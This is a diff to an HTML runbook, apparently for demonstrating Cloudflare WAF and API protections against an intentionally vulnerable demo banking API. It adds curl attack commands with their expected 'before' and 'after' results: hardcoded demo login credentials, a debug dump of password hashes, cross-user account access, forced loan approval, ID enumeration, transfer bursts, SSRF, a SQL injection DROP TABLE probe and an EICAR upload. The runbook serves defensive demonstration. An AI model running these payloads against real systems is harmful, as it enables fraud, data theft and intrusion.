@@ -70,6 +70,54 @@ Discovery surfaces the shadow endpoint the customer didn't know they had.</p>
 • Arm → disarm cycle leaves the zone in a clean pre-staged state (verified by spot re-checks)
 </div>
 
+<h2>Part 0 — Terminal setup: how to run every command in this guide</h2>
+
+<div class="box">
+<b>Use Git Bash.</b> Every command in this guide is bash + curl. Do not use PowerShell or cmd.exe —
+PowerShell's <code>curl</code> is a different tool (<code>Invoke-WebRequest</code>) and it mangles JSON
+quoting; cmd.exe doesn't understand the <code>$(...)</code> syntax at all.
+</div>
+
+<h3>Open the terminal</h3>
+<ul class="tight">
+  <li>In File Explorer, go to <code>C:\Users\drecla\Dev Projects\banking</code> → right-click inside the folder → <b>Open Git Bash here</b>.</li>
+  <li>Or in VS Code: Terminal → New Terminal, and set the profile dropdown to <b>Git Bash</b>.</li>
+</ul>
+
+<h3>Bootstrap once per terminal window</h3>
+<p>Paste this whole block. It sets the base URL, logs in as the attacker's ordinary customer
+(<code>chris.brown</code>), stores the JWT in <code>$TOKEN</code>, and finds that user's savings-account
+id in <code>$SAVINGS_ID</code>. Every attack command below assumes these three variables exist.</p>
+<pre>BASE=https://banking.puregroundscoffee.com
+
+TOKEN=$(curl.exe -s --ssl-no-revoke -X POST \\
+  -H 'Content-Type: application/json' \\
+  -d '{"username":"chris.brown","password":"cbrown123"}' \\
+  $BASE/api/auth/login | sed -n 's/.*"token":"\\([^\\"]*\\)".*/\\1/p')
+
+SAVINGS_ID=$(curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" \\
+  $BASE/api/accounts | sed -n 's/.*{"id":"\\([^\\"]*\\)"[^{]*"account_type":"savings".*/\\1/p' | head -1)
+
+echo "token loaded, savings account $SAVINGS_ID"</pre>
+<p><b>Verify it worked:</b> the echo line must print a UUID for the savings account. Tokens last 24h,
+but <b>re-paste the whole block if you open a new terminal</b> — the variables don't carry over.
+Note: the login endpoint allows 5 attempts/minute; the bootstrap uses one, each script uses one.</p>
+
+<h3>About the flags you'll see</h3>
+<ul class="tight">
+  <li><code>curl.exe</code> (not <code>curl</code>) — the real curl, even in Git Bash typing <code>curl.exe</code> is just explicit and safe.</li>
+  <li><code>--ssl-no-revoke</code> — required on this machine's network (TLS revocation lookups fail); harmless elsewhere.</li>
+  <li><code>-s</code> — quiet output. Drop it when you want to see headers/errors while troubleshooting.</li>
+</ul>
+
+<div class="box warn">
+<b>PowerShell fallback</b> (only if Git Bash is truly unavailable): always type <code>curl.exe</code>
+(never <code>curl</code>), write JSON bodies to a file with
+<code>'{"username":"chris.brown","password":"cbrown123"}' | Out-File login.json -Encoding utf8 -NoNewline</code>
+and send them with <code>--data "@login.json"</code>, and capture tokens with
+<code>$token = (curl.exe ... | ConvertFrom-Json).token</code>.
+</div>
+
 <h2>Part 1 — Pre-demo checklist (run the day before, ~20 minutes)</h2>
 
 <h3>1a. Machine &amp; network</h3>
@@ -155,6 +203,9 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403 at the edge</span></span>
     <b>Prep needed</b><span>None (rule is staged).</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke $BASE/api/internal/debug
+<span class="c"># before: JSON with every user incl. "password_hash" and "salt"</span>
+<span class="c"># after:  HTTP 403 — the request never reached the app</span></pre>
 </div>
 
 <div class="attack">
@@ -168,6 +219,9 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403 fallthrough block</span></span>
     <b>Prep needed</b><span>Schema uploaded during staging (already done — <code>demo-edge-config.py sync</code>).</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/v1/accounts
+<span class="c"># and the never-removed cross-user override:</span>
+curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/v1/accounts?userId=f49a7d79-e6dc-4c91-ba4a-5d62be9f81e7"</pre>
 </div>
 
 <div class="attack">
@@ -181,6 +235,18 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403; the loan stays pending_review</span></span>
     <b>Prep needed</b><span>None.</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/admin/users
+
+<span class="c"># apply for $3000 (auto-lands as pending_review), grab its id, then force-approve it:</span>
+LOAN=$(curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
+  -H 'Content-Type: application/json' \\
+  -d "{\"amount\":3000,\"termMonths\":24,\"disburseAccountId\":\"$SAVINGS_ID\"}" \\
+  $BASE/api/loans/apply)
+LOAN_ID=$(printf '%s' "$LOAN" | sed -n 's/.*"id":"\\([^\\"]*\\)".*/\\1/p')
+curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
+  $BASE/api/admin/loans/$LOAN_ID/force-approve
+<span class="c"># before: {"message":"Loan approved and disbursed",...} — refresh the dashboard, the money is there</span>
+<span class="c"># after:  HTTP 403 — and the loan is still pending_review</span></pre>
 </div>
 
 <div class="attack">
@@ -194,6 +260,13 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403/429 — enumeration dies</span></span>
     <b>Prep needed</b><span>None. Forward-looking note: Cloudflare's ML BOLA labels accrue on production traffic (10k+ sessions) — not shown live, position as posture tooling.</span>
   </div>
+  <pre><span class="c"># collect victim ids from the debug dump (works in "before"), then enumerate:</span>
+IDS=$(curl.exe -s --ssl-no-revoke $BASE/api/internal/debug \\
+  | grep -oE '"id":"[0-9a-f-]{36}"' | cut -d'"' -f4 | sort -u)
+for uid in $IDS; do
+  curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/users/$uid/balance; echo
+done
+<span class="c"># after: 403 on every one (fallthrough), or 429 once the enumeration rate limit trips</span></pre>
 </div>
 
 <div class="attack">
@@ -207,6 +280,11 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">?internal=1 → 403; base leak shown as the fix-the-app talking point</span></span>
     <b>Prep needed</b><span>None.</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile"
+<span class="c"># note "passwordHash" and "salt" right there in the base response</span>
+curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile?internal=1"
+<span class="c"># before: internal mode adds session payload + raw account rows</span>
+<span class="c"># after:  HTTP 403 — query string isn't in the documented contract</span></pre>
 </div>
 
 <div class="attack">
@@ -220,6 +298,14 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403/429 — burst dies</span></span>
     <b>Prep needed</b><span>None.</span>
   </div>
+  <pre>for i in $(seq 1 20); do
+  curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
+    -H 'Content-Type: application/json' \\
+    -d "{\"fromAccountId\":\"$SAVINGS_ID\",\"toUsername\":\"sarah.johnson\",\"toAccountType\":\"savings\",\"amount\":0.01}" \\
+    $BASE/api/transfers/express; echo
+done
+<span class="c"># before: 20 x "Express transfer completed"</span>
+<span class="c"># after:  HTTP 403 (undocumented path) from the first request</span></pre>
 </div>
 
 <div class="attack">
@@ -233,6 +319,12 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">429 past the fifth request</span></span>
     <b>Prep needed</b><span>None.</span>
   </div>
+  <pre>for i in $(seq 1 8); do
+  curl.exe -s --ssl-no-revoke -o /dev/null -w "application $i -> %{http_code}\n" --ssl-no-revoke \\
+    -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \\
+    -d '{"amount":2000,"termMonths":12}' $BASE/api/loans/apply
+done
+<span class="c"># before: eight 201s         after: five 201s then 429s</span></pre>
 </div>
 
 <div class="attack">
@@ -246,6 +338,12 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403</span></span>
     <b>Prep needed</b><span>None. (Workers cannot actually reach link-local IPs — use example.com for the visible exfil proof.)</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
+  -H 'Content-Type: application/json' \\
+  -d '{"url":"https://example.com/"}' \\
+  $BASE/api/profile/avatar-from-url
+<span class="c"># before: {"fetchedUrl":...,"bodyPreview":"<!doctype html>..."} — the Worker fetched it for us</span>
+<span class="c"># after:  HTTP 403 before the Worker ever runs</span></pre>
 </div>
 
 <div class="attack">
@@ -259,6 +357,12 @@ observed live during verification.</p>
     <b>After</b><span><span class="pill after">403/400 at the edge</span></span>
     <b>Prep needed</b><span>None.</span>
   </div>
+  <pre>curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
+  -H 'Content-Type: application/json' \\
+  -d '{not json' \\
+  $BASE/api/debug/parse
+<span class="c"># before: 500 with a JavaScript stack trace and internal file paths</span>
+<span class="c"># after:  a clean edge rejection — no error surface to mine</span></pre>
 </div>
 
 <h3>Companion surfaces (not OWASP-numbered)</h3>
@@ -268,6 +372,18 @@ observed live during verification.</p>
   <tr><td><code>POST /api/uploads</code> with the EICAR test file</td><td>Malware upload</td><td><b>Malicious uploads content scanning</b> (field: <code>cf.waf.content_scan.has_malicious_obj</code>)</td><td>403 once armed — <b>but</b> run from a network not covered by your own Gateway policy, or the client's network blocks it before Cloudflare ever sees it</td></tr>
   <tr><td><code>POST /api/transfers/batch</code> with a &gt;100 MB body</td><td>Oversized payload</td><td><b>Plan-tier request body limit</b></td><td>413 automatically (Enterprise zones: 500 MB threshold)</td></tr>
 </table>
+<pre><span class="c"># SQLi probe (expect 403 from managed WAF in BOTH states — great opener):</span>
+curl.exe -s --ssl-no-revoke -o /dev/null -w "SQLi probe -> %{http_code}\n" \\
+  -H "Authorization: Bearer $TOKEN" \\
+  "$BASE/api/transactions?sort=amount%3BDROP%20TABLE%20users%3B--"
+
+<span class="c"># EICAR upload (only works from a network without the client-side Gateway block):</span>
+printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
+curl.exe -s --ssl-no-revoke -w "\nHTTP %{http_code}\n" -X POST \\
+  -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/eicar.com" $BASE/api/uploads
+<span class="c"># disarmed: 201 Created (file got in) — delete it after:</span>
+<span class="c">#   ID=&lt;id from response&gt;; curl.exe -s --ssl-no-revoke -X DELETE -H "Authorization: Bearer $TOKEN" $BASE/api/uploads/$ID</span>
+<span class="c"># armed + clean network: 403 from content scanning</span></pre>
 
 <h2>Part 4 — Zone state &amp; recovery</h2>
 <table>
